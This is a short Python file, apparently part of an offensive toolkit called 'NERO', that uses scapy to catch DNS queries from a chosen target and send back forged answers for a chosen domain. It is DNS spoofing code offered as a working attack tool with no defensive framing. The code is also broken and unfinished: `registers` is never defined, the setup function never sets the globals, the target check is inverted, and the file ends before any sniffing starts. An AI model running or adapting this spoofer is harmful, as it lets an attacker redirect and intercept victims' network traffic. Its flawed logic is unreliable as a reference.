# this file is apart of NERO
# EXperimental, may occour any error
# Reference and special credits: Adrián Fernández Arnal (@adrianfa5)

from scapy.all import *
import os
import sys
import re 

target = ""
dns_target = ""
local = ""

def check(pkt):
    if(target and IP in pkt):result = True
    elif(IP in pkt): result = (pkt[IP].src == target)
    else: result = False
    return result

def send_fake(pkt):
    result = check(pkt)

    if(result and pkt[IP].src != local and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] == dns_target):
        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
        fakeResponse = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[cap_domain]))
        send(fakeResponse, verbose=0)
        print("[*] Spoofed {} to {}".format(pkt[IP].dst, pkt[IP].src))

def _user(ip,lip,port,dns):
    _filter = 'udp dst port 53'
    target = ip
    local = lip
    dns_target = dns